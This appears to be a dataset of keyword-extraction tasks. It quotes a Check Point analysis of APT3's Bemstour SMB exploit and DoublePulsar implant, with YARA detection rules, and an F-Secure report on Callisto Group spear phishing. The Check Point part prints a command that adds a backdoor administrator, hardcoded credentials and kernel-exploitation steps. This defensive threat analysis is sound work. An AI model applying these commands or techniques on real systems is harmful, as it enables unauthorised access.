input buffer pointer of a target Transaction structure, as outlined above.Same technique.Can be achieved by overwriting the output buffer pointer of a target Transaction structure, as outlined above.APT3 doesn’t use this primitive.Uses an RWE page in the srv.sys memory section.Uses HAL’s heap.Overwrites an unimplemented SMB command point‐ er in the SMB command handler table, and sends an SMB transaction for this command to execute a han‐ dler (which is in fact shellcode).Overwrites a named pipe con‐ nection handler function which executes after the connection is closed.In addition, we conducted a quantitative analysis of various actions performed during both exploits, as can be seen in the following table:Parameterurl‐ manceAPT3 Exploit (UPSynergy)9/249/6/2019UPSynergy: Chinese-American Spy vs. Spy Story - Check Point ResearchInfo leak exploit usage Usage of a write-what-where primitive Usage of a read-what-where primitive Number of attempts to overwrite a Transaction structure in case of failure on the ﬁrst try2 times 2 attempts1 time 0 attemptsFrom this table, we can infer that the UPSynergy information leak signiﬁcantly eases the exploitation process, as the leaked CCB object described earlier contains almost a direct code execution primitive. In EternalRomance, we could see the usage of a read-what-where primitive, mainly used for dereferencing child structs of a leaked Transaction struct. In the case of UPSynergy, that would be redundant.Having said that, there is a slight chance of instability in the grooming implementation of UPSynergy, where a write to an unallocated page might lead to an unintended BSOD. This will not happen in EternalRomance (point for the Equation group).Comparison of APT3 and Equation Group ImplantsThe last action to take place following the exploitation is the set-up and invocation of an implant shellcode. The purpose is to serve as a basic backdoor, allowing the attacker to issue a further kernel mode payload and execute it on the target machine. In the case of both APT3 and Equation group, an implant named DoublePulsar is used. This implant was leaked by The Shadow Brokers in 2017.In both cases, there is a very similar ﬂow to the implant’s operation – a hook is set up for a particular SMB handler function to handle invalid SMBs. This hook searches for one of 3 commands in a particular SMB ﬁeld and executes a corresponding function for each one. One of the supported commands is responsible for accepting further shellcode and running it – the last stage payload. At this point, the attacker may issue an arbitrary piece of code for execution in the kernel space.As far as APT3’s implant is concerned, it seems likely f the DoublePulsar code was reused as is. The code is not executed directly, but has several layers of obfuscation. Essentially, the Equation group’s DoublePulsar code is wrapped with an APT3 position independent crypter & loader.In the following sections, we take a look at the differences and supplements provided by APT3. As we will see, the main logic ﬂow was preserved in both cases. However, the differences show that APT3 did not want to fully disclose the fact it was using an allegedly American implant.1st Stage – DoublePulsar LoaderThe very ﬁrst stage of the implant’s code is a custom loader written by APT3, which extracts an encrypted version of DoublePulsar code from incoming SMB packets, and decrypts and executes it. This is in fact a self-modifying piece of code, i.e. before it actually handles any of the aforementioned functionalities, it must decrypt subsequent parts of itself. The code is wrapped in 2 layers using simple crypters, so the ﬁrst crypter decodes the second, and the latter decodes the actual loader code.url Chinese-American Spy vs. Spy Story - Check Point ResearchFigure 14: First and second phase of decoding the loader’s payload.After these phases are completed, the loader starts its operation which is broken down into the following steps:1. Dynamic function resolution. 2. Determine the OS version. 3. Locate the SrvTreeConnectList in sys. 4. Extract the encoded shellcode from a Transaction object list. 5. Execute the shellcode.The ﬁgure below summarizes this ﬂow, showing the main code of this loader. We then present a detailed outline of each of these steps, and point out the major differences that set this code apart from that of the Equation group.url Chinese-American Spy vs. Spy Story - Check Point ResearchFigure 15: The main ﬂow of the 1st stage loader.Step 1: Dynamic function resolutionAs this is essentially position independent code, we need to resolve some API functions dynamically, which are then used during run time. First, we must locate the base address of the ntoskrnl.exe image. We do this by obtaining the KPCR structure from the FS register, and use offset 0x38 which points to KIDTENTRY *IDT (i.e. the interrupt dispatch table). As we know the latter resides within ntoskrnl.exe and is aligned to the beginning of a page, so it is sufﬁcient to walk back in page multiples until the start of the page is equivalent to the magic number of a PE.After that is done, it’s possible to parse the export table of ntoskrnl.exe to achieve several basic API function addresses. A common technique is to parse the export tables of a relevant loaded image where these functions reside (e.g. ntoskrnl.exe), hash the names of their exports, and compare them to hardcoded ones. The latter represent the names of the functions that require address resolution. In this case, we see that the hashing function differs from that of the Equation group, resulting in different name hashes.Function Name 0x0DDE5CDD –Equation Hash 0x0F0835485url Chinese-American Spy vs. Spy Story - Check Point ResearchFigure 16: Different name hashing implementations and their resulting string hashes.We see that not only different hashing algorithms are used, but also different API functions. For instance, the Equation group uses a simple pool allocation via the ExAllocatePool API, while APT3 uses a tagged allocation and calls ExAllocatePoolWithTag. In the latter case, the used tag represents a work context structure.Figure 17: APT3 tagged allocation.Step 2: Determining the OS versionNext, the loader invokes the RtlGetVersion function to obtain information about the underlying Windows version. It then assigns a numeric value to a ﬁeld in a particular struct maintained by the loader, which corresponds to the OS version. The value is in fact an offset into an undocumented SMB struct called CONNECTION, which will result in a ﬁeld that points to yet another undocumented struct called PAGED_CONNECTION. How this struct is used will be evident in subsequent steps.url Chinese-American Spy vs. Spy Story - Check Point ResearchFigure 18: Determining the version of Windows, and choosing a corresponding offset value.Step 3: Locating sys and SrvTreeConnectListAt this point, the loader tries to ﬁnd Srv.sys (the SMB driver’s image) and parse it. This is done to locate a global undocumented list named SrvTreeConnectList. Srv.sys is located using ZwQuerySystemInformation to obtain a list of loaded module information (where a base address of the loaded images is speciﬁed), while the struct is found by going through Srv.sys’ .data section and looking for several identifying numeric parameters.Step 4: Extracting encoded shellcode from a Transaction object list.After the list is found, it is used to go through several linked SMB structures to ﬁnally obtain a list of Transaction structs. The latter allows us to access the data obtained from relevant SMB Trans packets which contains the subsequent shellcode.The chain of these structures can be seen in the ﬁgure below. The main takeaway is that all of these structures are undocumented – i.e. the developers of APT3 must have done quite a bit of reverse engineering on Srv.sys to infer them (on more than one Windows version, as evident from the offset to PAGED_CONNECTION). This effort is very similar to the one invested by the NSA to ﬁnd the various Eternal exploits around the same time.url Chinese-American Spy vs. Spy Story - Check Point ResearchFigure 19: APT3’s code to ‘walk’ through various undocumented SMB strucures, suggesting that a considerable analysis was performed and the group’s members have a good understanding of the SMB internals.Step 5: Executing the shellcodeAfter the shellcode is obtained and decoded, it is ﬁnally executed. This leads to the next stage, which is yet another piece of self-modifying PIC. However, in this case, most of the code that is unravelled after 2 layers of decoding is a variant of the original DoublePulsar, as used by the Equation group.2nd Stage – DoublePulsar Installation & HookIn this stage of the implant’s operation, yet another shellcode runs. As previously mentioned, this code is obfuscated with 2 layers of crypters, the same ones used to wrap the loader in the 1st stage. The code that is unpacked was mostly not written by APT3.The ﬁrst part of the resulting PIC seems to be custom-made, and invokes a system thread that works periodically to form paged allocations of various sizes. It can run in rounds indeﬁnitely, creating 256 allocations for each round and counting the number that get an address within the range of 64 bytes from the point in which the ﬁrst shellcode was written. Only if there are more than 64 ‘faulty’ allocations can this loop terminate. The purpose is not fully clear, but could be an attempt to avoid paging out the shellcode buffers from the paged pool.The other part of this internal payload installs DoublePulsar. This is done by replacing a function pointer to point at a hook function instead of the original function named SrvTransactionNotImplemented. The replacement of this pointer happens in a hard-coded table in the SMB driver (srv.sys) named SrvTransaction2DispatchTable.In essence, both APT3 and the Equation group take similar steps to achieve this goal. These are outlined in the ﬁgure below, and are more thoroughly explained here and here.Figure 20: The general steps taken to install DoublePulsar’s hook, in both implementations of the shellcode.You can see the similarity in the call ﬂow graph comparison of these hook functions:url Chinese-American Spy vs. Spy Story - Check Point ResearchFigure 21: CFG comparison of the DoublePulsar hook functions.This particular hook function anticipates an initial command named “ping” where a XOR key is obtained from the attacker. This key can then be used to decode the payload of subsequent SMBs carrying additional shellcode. The latter is executed as part of another command called “exec”.url Chinese-American Spy vs. Spy Story - Check Point ResearchFigure 22: Commands supported by the 2nd stage hook backdoor.There is an addition to the code that was not observed in other variants of DoublePulsar. This addition is a common snippet used to disable the WP bit ﬂag of the CR0 register, which allows the kernel to write into read only pages. It is not clear if this serves any purpose in the implant’s operation, but it is reasonable to assume that it was bundled to a version of DoublePulsar that was captured by APT3 and was simply left as a code residue.Figure 23: Code snippet from DoublePulsar, used to clear the WP ﬂag in CR0.3rd Stage – APC InjectorThe last stage of the implant is a piece of code that performs APC injection of a hardcoded routine to the “services.exe” process in the user space. In turn, this routine can write a given payload to a new ﬁle and execute it, or run a shell command. In both cases, the API used for the url execution is WinExec.17/249/6/2019UPSynergy: Chinese-American Spy vs. Spy Story - Check Point ResearchIt’s worth noting that while an arbitrary command can be issued by the user, there are several hardcoded commands that the shellcode runs through the invoked APC in the user space. One of these commands adds a new user as local admin with a hardcoded name and password. In the sample analyzed for this publication, this username is cessupport and the password is 1qaz#EDC.Figure 24: Hardcoded shell command to add a new admin user to the system.The implementation of this part doesn’t resemble that of the Equation group (compared to their equivalent APC injector). It’s also different from the previous stages of APT3’s implant. For example, function resolution does not use string hashes anymore, but rather makes comparisons to strings stored in the stack. The allocations are no longer tagged and the overall choice of API functions for similar actions looks different. This may mean that there was another entity within the group that was involved in the development of this part, but not of previous ones.ConclusionIn our research, we analyzed and compared the exploit development efforts done by 2 major actors in the APT landscape – the Equation group and APT3. While the former is known for its advanced and almost unparalleled capabilities in the ﬁeld of vulnerability research, it is interesting to observe how other groups focus on similar research objectives, with a considerable degree of success.It’s not always clear how threat actors achieve their exploitation tools, and it’s commonly assumed that actors can conduct their own research and development or get it from a third party. In this case we have evidence to show that a third (but less common) scenario took place – one where attack artifacts of a rival (i.e. Equation group) were used as the basis and inspiration for establishing in-house offensive capabilities by APT3.url Chinese-American Spy vs. Spy Story - Check Point ResearchAlthough we can’t prove this beyond any doubt, we brought many facts and analysis ﬁndings to back up our speculations. We will continue our efforts to ﬁnd the answers to these as well as any future questions that arise.Check Point protects against the exploits issued by the Bemstour tool with the IPS protection ‘Microsoft SMB Client Transaction Memory Corruption (MS10-020)’.We would like to thank Eyal Itkin for assisting in parts of the analysis during this research. Yara Rules:url Chinese-American Spy vs. Spy Story - Check Point Researchrule apt3_bemstour_strings description = ""Detects strings used by the Bemstour exploitation tool"" author = ""Mark Lechtik"" company = ""Check Point Software Technologies LTD."" date = ""2019-06-25"" $dbg_print_1 = ""leaked address is 0x%llx"" ascii wide $dbg_print_2 = ""========== %s =========="" ascii wide $dbg_print_3 = ""detailVersion:%d"" ascii wide $dbg_print_4 = ""create pipe twice failed"" ascii wide $dbg_print_5 = ""WSAStartup function failed with error: %d"" ascii wide $dbg_print_6 = ""can't open input file."" ascii wide $dbg_print_7 = ""Allocate Buffer Failed."" ascii wide $dbg_print_8 = ""Connect to target failed."" ascii wide $dbg_print_9 = ""connect successful."" ascii wide $dbg_print_10 = ""not supported Platform"" ascii wide $dbg_print_11 = ""Wait several seconds."" ascii wide $dbg_print_12 = ""not set where to write ListEntry ."" ascii wide $dbg_print_13 = ""backdoor not installed."" ascii wide $dbg_print_14 = ""REConnect to target failed."" ascii wide $dbg_print_15 = ""Construct TreeConnectAndX Request Failed."" ascii wide $dbg_print_16 = ""Construct NTCreateAndXRequest Failed."" ascii wide $dbg_print_17 = ""Construct Trans2 Failed."" ascii wide $dbg_print_18 = ""Construct ConsWXR Failed."" ascii wide $dbg_print_19 = ""Construct ConsTransSecondary Failed."" ascii wide $dbg_print_20 = ""if you don't want to input password , use server2003 version "" ascii $cmdline_1 = ""Command format %s TargetIp domainname username password 2"" ascii wide $cmdline_2 = ""Command format %s TargetIp domainname username password 1"" ascii wide $cmdline_3 = ""cmd.exe /c net user test test /add && cmd.exe /c net localgroup administrators test /add"" ascii wide $cmdline_4 = ""hello.exe \""C:\\WINDOWS\\DEBUG\\test.exe\"""" ascii wide $cmdline_5 = ""parameter not right"" ascii wide $smb_param_1 = ""browser"" ascii wide $smb_param_2 = ""spoolss"" ascii wide $smb_param_3 = ""srvsvc"" ascii wide $smb_param_4 = ""\\PIPE\\LANMAN"" ascii wide $smb_param_5 = ""Werttys for Workgroups 3.1a"" ascii wide $smb_param_6 = ""PC NETWORK PROGRAM 1.0"" ascii wide $smb_param_7 = ""LANMAN1.0"" ascii wide $smb_param_8 = ""LM1.2X002"" ascii wide $smb_param_9 = ""LANMAN2.1"" ascii wide $smb_param_10 = ""NT LM 0.12"" ascii wide $smb_param_12 = ""WORKGROUP"" ascii wide $smb_param_13 = ""Windows Server 2003 3790 Service Pack 2"" ascii wide $smb_param_14 = ""Windows Server 2003 5.2"" ascii wide $smb_param_15 = ""Windows 2002 Service Pack 2 2600"" ascii wide $smb_param_16 = ""Windows 2002 5.1"" ascii wide $smb_param_17 = ""PC NETWORK PROGRAM 1.0"" ascii wide $smb_param_18 = ""Windows 2002 5.1"" ascii wide $smb_param_19 = ""Windows for Workgroups 3.1a"" ascii wide $unique_str_1 = ""WIN-NGJ7GKNROVS"" $unique_str_2 = ""XD-A31C2E0087B2"" condition:url Chinese-American Spy vs. Spy Story - Check Point Researchuint16(0) == 0x5a4d and (5 of ($dbg_print*) or 2 of ($cmdline*) or 1 of ($unique_str*)) and 3 of ($smb_param*) description = ""Detects an implant used by Bemstour exploitation tool (APT3)"" author = ""Mark Lechtik"" company = ""Check Point Software Technologies LTD."" date = ""2019-06-25"" 0x41b7e1L C745B8558BEC83 mov dword ptr [ebp - 0x48], 0x83ec8b55 0x41b7e8L C745BCEC745356 mov dword ptr [ebp - 0x44], 0x565374ec 0x41b7efL C745C08B750833 mov dword ptr [ebp - 0x40], 0x3308758b 0x41b7f6L C745C4C957C745 mov dword ptr [ebp - 0x3c], 0x45c757c9 0x41b7fdL C745C88C4C6F61 mov dword ptr [ebp - 0x38], 0x616f4c8c C7 45 ?? 55 8B EC 83 C7 45 ?? EC 74 53 56 C7 45 ?? 8B 75 08 33 C7 45 ?? C9 57 C7 45 C7 45 ?? 8C 4C 6F 61 any of them }url Chinese-American Spy vs. Spy Story - Check Point Researchrule apt3_bemstour_implant_command_stack_variable description = ""Detecs an implant used by Bemstour exploitation tool (APT3)"" author = ""Mark Lechtik"" company = ""Check Point Software Technologies LTD."" date = ""2019-06-25"" 0x41ba18L C78534FFFFFF636D642E mov dword ptr [ebp - 0xcc], 0x2e646d63 0x41ba22L C78538FFFFFF65786520 mov dword ptr [ebp - 0xc8], 0x20657865 0x41ba2cL C7853CFFFFFF2F632063 mov dword ptr [ebp - 0xc4], 0x6320632f 0x41ba36L C78540FFFFFF6F707920 mov dword ptr [ebp - 0xc0], 0x2079706f 0x41ba40L C78544FFFFFF2577696E mov dword ptr [ebp - 0xbc], 0x6e697725 0x41ba4aL C78548FFFFFF64697225 mov dword ptr [ebp - 0xb8], 0x25726964 0x41ba54L C7854CFFFFFF5C737973 mov dword ptr [ebp - 0xb4], 0x7379735c 0x41ba5eL C78550FFFFFF74656D33 mov dword ptr [ebp - 0xb0], 0x336d6574 0x41ba68L C78554FFFFFF325C636D mov dword ptr [ebp - 0xac], 0x6d635c32 0x41ba72L C78558FFFFFF642E6578 mov dword ptr [ebp - 0xa8], 0x78652e64 0x41ba7cL C7855CFFFFFF65202577 mov dword ptr [ebp - 0xa4], 0x77252065 0x41ba86L C78560FFFFFF696E6469 mov dword ptr [ebp - 0xa0], 0x69646e69 0x41ba90L C78564FFFFFF72255C73 mov dword ptr [ebp - 0x9c], 0x735c2572 0x41ba9aL C78568FFFFFF79737465 mov dword ptr [ebp - 0x98], 0x65747379 0x41baa4L C7856CFFFFFF6D33325C mov dword ptr [ebp - 0x94], 0x5c32336d 0x41baaeL C78570FFFFFF73657468 mov dword ptr [ebp - 0x90], 0x68746573 0x41bab8L C78574FFFFFF632E6578 mov dword ptr [ebp - 0x8c], 0x78652e63 0x41bac2L C78578FFFFFF65202F79 mov dword ptr [ebp - 0x88], 0x792f2065 0x41baccL 83A57CFFFFFF00 and dword ptr [ebp - 0x84], 0 C7 85 ?? ?? ?? ?? 63 6D 64 2E C7 85 ?? ?? ?? ?? 65 78 65 20 C7 85 ?? ?? ?? ?? 2F 63 20 63 C7 85 ?? ?? ?? ?? 6F 70 79 20 C7 85 ?? ?? ?? ?? 25 77 69 6E C7 85 ?? ?? ?? ?? 64 69 72 25 C7 85 ?? ?? ?? ?? 5C 73 79 73 C7 85 ?? ?? ?? ?? 74 65 6D 33 C7 85 ?? ?? ?? ?? 32 5C 63 6D C7 85 ?? ?? ?? ?? 64 2E 65 78 C7 85 ?? ?? ?? ?? 65 20 25 77 C7 85 ?? ?? ?? ?? 69 6E 64 69 C7 85 ?? ?? ?? ?? 72 25 5C 73 C7 85 ?? ?? ?? ?? 79 73 74 65 C7 85 ?? ?? ?? ?? 6D 33 32 5C C7 85 ?? ?? ?? ?? 73 65 74 68 C7 85 ?? ?? ?? ?? 63 2E 65 78 C7 85 ?? ?? ?? ?? 65 20 2F 79 83 A5 ?? ?? ?? ?? 00 }url Chinese-American Spy vs. Spy Story - Check Point Research/* 0x41baeeL C785D8FEFFFF636D6420 mov dword ptr [ebp - 0x128], 0x20646d63 0x41baf8L C785DCFEFFFF2F632022 mov dword ptr [ebp - 0x124], 0x2220632f 0x41bb02L C785E0FEFFFF6E657420 mov dword ptr [ebp - 0x120], 0x2074656e 0x41bb0cL C785E4FEFFFF75736572 mov dword ptr [ebp - 0x11c], 0x72657375 0x41bb16L C785E8FEFFFF20636573 mov dword ptr [ebp - 0x118], 0x73656320 0x41bb20L C785ECFEFFFF73757070 mov dword ptr [ebp - 0x114], 0x70707573 0x41bb2aL C785F0FEFFFF6F727420 mov dword ptr [ebp - 0x110], 0x2074726f 0x41bb34L C785F4FEFFFF3171617A mov dword ptr [ebp - 0x10c], 0x7a617131 0x41bb3eL C785F8FEFFFF23454443 mov dword ptr [ebp - 0x108], 0x43444523 0x41bb48L C785FCFEFFFF202F6164 mov dword ptr [ebp - 0x104], 0x64612f20 0x41bb52L C78500FFFFFF64202626 mov dword ptr [ebp - 0x100], 0x26262064 0x41bb5cL C78504FFFFFF206E6574 mov dword ptr [ebp - 0xfc], 0x74656e20 0x41bb66L C78508FFFFFF206C6F63 mov dword ptr [ebp - 0xf8], 0x636f6c20 0x41bb70L C7850CFFFFFF616C6772 mov dword ptr [ebp - 0xf4], 0x72676c61 0x41bb7aL C78510FFFFFF6F757020 mov dword ptr [ebp - 0xf0], 0x2070756f 0x41bb84L C78514FFFFFF61646D69 mov dword ptr [ebp - 0xec], 0x696d6461 0x41bb8eL C78518FFFFFF6E697374 mov dword ptr [ebp - 0xe8], 0x7473696e 0x41bb98L C7851CFFFFFF7261746F mov dword ptr [ebp - 0xe4], 0x6f746172 0x41bba2L C78520FFFFFF72732063 mov dword ptr [ebp - 0xe0], 0x63207372 0x41bbacL C78524FFFFFF65737375 mov dword ptr [ebp - 0xdc], 0x75737365 0x41bbb6L C78528FFFFFF70706F72 mov dword ptr [ebp - 0xd8], 0x726f7070 0x41bbc0L C7852CFFFFFF74202F61 mov dword ptr [ebp - 0xd4], 0x612f2074 0x41bbcaL C78530FFFFFF64642200 mov dword ptr [ebp - 0xd0], 0x226464 0x41bbd4L 6A5C push 0x5c C7 85 ?? ?? ?? ?? 63 6D 64 20 C7 85 ?? ?? ?? ?? 2F 63 20 22 C7 85 ?? ?? ?? ?? 6E 65 74 20 C7 85 ?? ?? ?? ?? 75 73 65 72 C7 85 ?? ?? ?? ?? 20 63 65 73 C7 85 ?? ?? ?? ?? 73 75 70 70 C7 85 ?? ?? ?? ?? 6F 72 74 20 C7 85 ?? ?? ?? ?? 31 71 61 7A C7 85 ?? ?? ?? ?? 23 45 44 43 C7 85 ?? ?? ?? ?? 20 2F 61 64 C7 85 ?? ?? ?? ?? 64 20 26 26 C7 85 ?? ?? ?? ?? 20 6E 65 74 C7 85 ?? ?? ?? ?? 20 6C 6F 63 C7 85 ?? ?? ?? ?? 61 6C 67 72 C7 85 ?? ?? ?? ?? 6F 75 70 20 C7 85 ?? ?? ?? ?? 61 64 6D 69 C7 85 ?? ?? ?? ?? 6E 69 73 74 C7 85 ?? ?? ?? ?? 72 61 74 6F C7 85 ?? ?? ?? ?? 72 73 20 63 C7 85 ?? ?? ?? ?? 65 73 73 75 C7 85 ?? ?? ?? ?? 70 70 6F 72 C7 85 ?? ?? ?? ?? 74 20 2F 61 C7 85 ?? ?? ?? ?? 64 64 22 00 0x41be22L C745D057696E45 mov dword ptr [ebp - 0x30], 0x456e6957 0x41be29L C745D478656300mov dword ptr [ebp - 0x2c], 0x636578url Chinese-American Spy vs. Spy Story - Check Point Research0x41be30L C7459C47657450 mov dword ptr [ebp - 0x64], 0x50746547 0x41be37L C745A0726F6341 mov dword ptr [ebp - 0x60], 0x41636f72 0x41be3eL C745A464647265 mov dword ptr [ebp - 0x5c], 0x65726464 0x41be45L C745A873730000 mov dword ptr [ebp - 0x58], 0x7373 0x41be4cL C745C443726561 mov dword ptr [ebp - 0x3c], 0x61657243 0x41be53L C745C874654669 mov dword ptr [ebp - 0x38], 0x69466574 0x41be5aL C745CC6C654100 mov dword ptr [ebp - 0x34], 0x41656c 0x41be61L C745B857726974 mov dword ptr [ebp - 0x48], 0x74697257 0x41be68L C745BC6546696C mov dword ptr [ebp - 0x44], 0x6c694665 0x41be6fL C745C065000000 mov dword ptr [ebp - 0x40], 0x65 0x41be76L C745AC436C6F73 mov dword ptr [ebp - 0x54], 0x736f6c43 0x41be7dL C745B06548616E mov dword ptr [ebp - 0x50], 0x6e614865 0x41be84L C745B4646C6500 mov dword ptr [ebp - 0x4c], 0x656c64 0x41be8bL 894DE8 mov dword ptr [ebp - 0x18], ecx C7 45 ?? 57 69 6E 45 C7 45 ?? 78 65 63 00 C7 45 ?? 47 65 74 50 C7 45 ?? 72 6F 63 41 C7 45 ?? 64 64 72 65 C7 45 ?? 73 73 00 00 C7 45 ?? 43 72 65 61 C7 45 ?? 74 65 46 69 C7 45 ?? 6C 65 41 00 C7 45 ?? 57 72 69 74 C7 45 ?? 65 46 69 6C C7 45 ?? 65 00 00 00 C7 45 ?? 43 6C 6F 73 C7 45 ?? 65 48 61 6E C7 45 ?? 64 6C 65 00 any of them }url ","{'phrases': ['Bemstour', 'an SMB connection', 'the victim', 'EternalRomance', 'primitive', 'data', 'Uses', 'a 0-day info leak', 'the address', 'a kernel object', 'ALL', 'step', 'Overwrites', 'a function pointer', 'the CCB', 'the shellcode', 'decrypts', 'DoublePulsar', 'a hook', 'Commands'], 'target': 'Bemstour; an SMB connection; the victim; EternalRomance; primitive; data; Uses; a 0-day info leak; the address; a kernel object; ALL; step; Overwrites; a function pointer; the CCB; the shellcode; decrypts; DoublePulsar; a hook; Commands.'}"
the Callisto Group; spear; emails; malicious attachments; the victim; the attachment; RCS; the shellcode; the Scout malware; its victim; the call; RAT; data; the infected host; 10; RAT; Detection; detection.,"[""1. The group identifies targets with access to intelligence related to foreign policy and security in Eastern Europe and South Caucasus regions. 2. Credential phishing emails are sent pretending to be Google, claiming the target's account will be deleted unless credentials are entered on a fake login page. 3. If credentials are entered, the group gains access to the target's email account. 4. The group compromises other relevant email accounts and monitors target email communications. 5. Spear phishing emails are crafted to appear they are from compromised accounts familiar to the target. The emails have document attachments containing malware. 6. If the target opens the attachment and enables the malware, the Scout tool from HackingTeam Galileo installs on the system. 7. The malware gathers system information and sends it to the group's command and control server. 8. The group uses the malware to explore the target's system and network, stealing data and installing additional tools. 9. The compromised access allows the group to monitor target communications and steal intelligence on foreign policy related to regions of interest. 10. The group continues to set up new phishing infrastructure regularly to pursue more targets. ""]","Extract the keywords: CALLISTO GROUPTLP: WhiteSUMMARY The Callisto Group is an advanced threat actor whose known targets include military personnel, government officials, think tanks, and journalists in Europe and the South Caucasus. Their primary interest appears to be gathering intelligence related to foreign and security policy in the Eastern Europe and South Caucasus regions.In October 2015 the Callisto Group targeted a handful of individuals with phishing emails that attempted to obtain the target’s webmail credentials.In early 2016 the Callisto Group began sending highly targeted spear phishing emails with malicious attachments that contained, as their final payload, the “Scout” malware tool from the HackingTeam RCS Galileo platform.These spear phishing emails were crafted to appear highly convincing, including being sent from legitimate email accounts suspected to have been previously compromised by the Callisto Group via credential phishing.The Callisto Group has been active at least since late 2015 and continues to be so, including continuing to set up new phishing infrastructure every week.F-SECURE LABS THREAT INTELLIGENCEMalware analysis WhitepaperPublished: April 2017CONTENTSSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2Intelligence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3 Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3 Attack overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3 Phase 1: credential phishing . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3 Phase 2: spear phishing with malicious attachments . . . . . . . 3 Malware usage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4 Consequences . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5 Targeting and attribution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5 Continuing activity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5Identification, mitigation, and remediation . . . . . . . . . . . . . . . 6 Identifying Callisto Group activity . . . . . . . . . . . . . . . . . . . . . . . 6 Mitigation against credential phishing . . . . . . . . . . . . . . . . . . . 6 Remediation against credential phishing . . . . . . . . . . . . . . . . 6 Mitigation against spear phishing and RCS Galileo . . . . . . . . 6 Remediation against RCS Galileo . . . . . . . . . . . . . . . . . . . . . . . . 6Appendix A | Indicators of Compromise . . . . . . . . . . . . . . 7INTELLIGENCEINTRODUCTION The Callisto Group is an advanced threat actor that, as far as we know, has never been identified . The primary focus of the Callisto Group appears to be intelligence gathering related to European foreign and security policy .This report focuses on describing activity dating from late 2015 to the present day that we have been able to definitively associate with the Callisto Group . Also, some indications of loosely linked activity dating back to at least 2013 is provided in the section “Related activity” (page 3) . However, we do not currently attribute this older activity directly to the Callisto Group .ATTACK OVERVIEWPHASE 1: CREDENTIAL PHISHING In October 2015, the Callisto Group was observed sending targeted credential phishing emails with the subject “Remove account [target’s Gmail address]” . These emails purported to come from Google alerting the target that their Gmail account was about to be removed . The emails requested the target to click a link to prevent their account from being removed . If clicked, this link would lead to a phishing website that attempts to harvest the target’s Gmail credentials .The emails were designed to appear authentic and convincing . The domains used Google or commonly known Google services in both the referenced links and the sender’s email .Based on our information, these emails were highly targeted and were only sent to a handful of targets . At least some of the recipient Gmail addresses were personal accounts of the target and not readily available to the public, suggesting thorough reconnaissance by the attackers .Known targets include European military personnel . We also have reason to believe this or related phishing incidents targeted key personnel in European think tanks .PHASE 2: SPEAR PHISHING WITH MALICIOUS ATTACHMENTS In early 2016, the Callisto Group was observed sending targeted spear phishing emails containing malicious attachments . These emails were sent from email accounts of individuals likely to be familiar to the recipient . We believe these email accounts were compromised in the previous phase of the attack, or in similar related phishing attacks .Known spear phishing emails made reference to a conference with relevance to European security policy . The malicious attachments purported to be invitations or drafts of the agenda for the conference . The compromised email accounts used to send the spear phishing emails belonged to individuals involved in organizing the conference . Combining this information together resulted in highly convincing spear phishing .Known targets of these spear phishing emails with malicious attachments include military personnel, government officials, think tanks, and journalists in Europe and the South Caucasus . We are currently not aware of any evidence suggesting any of these individuals were compromised, just that they were targeted .All known malicious attachments sent with these spear phishing emails were Microsoft Word .docx files . None of the known files exploited any vulnerabilities . Rather, the files utilize a feature of Microsoft Word that allows “objects” to be embedded in docx files . In the case of these malicious files, the embedded object is the malware executable .3IMAGE 1Icon for an embedded malwareexecutable in a malicious attachmentIMAGE 2Icon for an embedded malwareexecutable in another malicious attachmentWarning prompt shown to the user by recent versions of Microsoft Wordif the user clicks the icon for the embedded malware executable .The malware will only be executed if the user clicks “OK” .IMAGE 3For the embedded malware to be executed, a user needs to click an icon in the docx file (see Images 1 and 2 for examples) . Additionally, in recent versions of Microsoft Word, if a user clicks the icon for the embedded executable, Word will prompt the user with a warning (see Image 3) . The payload will only be executed if the user acknowledges the prompt .MALWARE USAGE In all known malicious attachments, the final payload was a variant of the “Scout” tool from the HackingTeam Remote Control System (RCS) Galileo hacking platform . HackingTeam is an Italian software company that created RCS, which they describe as “the hacking suite for governmental interception” .1 In July 2015, news emerged that HackingTeam had been breached . One of the consequences of this incident was the then latest version of RCS Galileo being leaked to the public .2As a result of the leak, both the source code and the ready-made installers for the RCS platform were made available for anyone to use . Based on our analysis of Callisto Group’s usage of RCS Galileo, we believe the Callisto Group did not utilize the leaked RCS Galileo source code, but rather used the leaked ready- made installers to set up their own installation of the RCS Galileo platform . The process for using the leaked installers to set up an RCS Galileo installation has been described online in publicly available blogposts, making the process trivial to achieve .In the known spear phishing attacks by the Callisto Group, they employed the “Scout” malware tool from the RCS Galileo platform . The “Scout” malware tool is a light backdoor intended to be used as an initial reconnaissance tool to gather basic system information and screenshots from a compromised computer, as well as enable the installation of additional malware .41 . HackingTeam;url .hackingteam .it/2 . Arstechnica; Hacking Team getshacked; invoices suggest spyware sold to repressive govts; published 7 Jul 2015; url .com/ security/2015/07/hacking-team-gets- hacked-invoices-show-spyware-sold- to-repressive-govts/CONSEQUENCES If a target of the credential phishing described in “Phase 1: credential phishing” clicked a link in the email and proceeded to input their email credentials on the resulting phishing website, this would provide the Callisto Group with the target’s email credentials . Unless the target was using two- factor-authentication, the Callisto Group would then have full access to the target’s email account .We are confident the Callisto Group used this type of access to a target’s email account for the purposes of sending spear phishing to other targets . We also believe it is highly likely that the Callisto Group would leverage the same access to read and monitor the target’s email activity .If a target of the spear phishing described in “Phase 2: malware deployment” opened the email attachment and, crucially, clicked on the icon in the attachment, this would lead to the target’s computer becoming infected with the “Scout” malware tool from the RCS Galileo platform . This malware tool would have gathered basic information on the target’s computer and delivered these to the Callisto Group . This malware tool would have also enabled the Callisto Group to install additional malware on the target’s computer .In effect, this would have provided the Callisto Group with full remote access to the target’s computer, and by extension, to any data accessible to the target via their computer .TARGETING AND ATTRIBUTION The most obvious common theme between all known targets of the Callisto Group is an involvement in European foreign and security policy, whether as a military or government official, being employed by a think tank, or working as a journalist . More specifically, many of the known targets have a clear relation to foreign and security policy involving both Eastern Europe and the South Caucasus .This targeting suggests the Callisto Group is interested in intelligence gathering related to foreign and security policy . Furthermore, we are unaware of any targeting in the described attacks 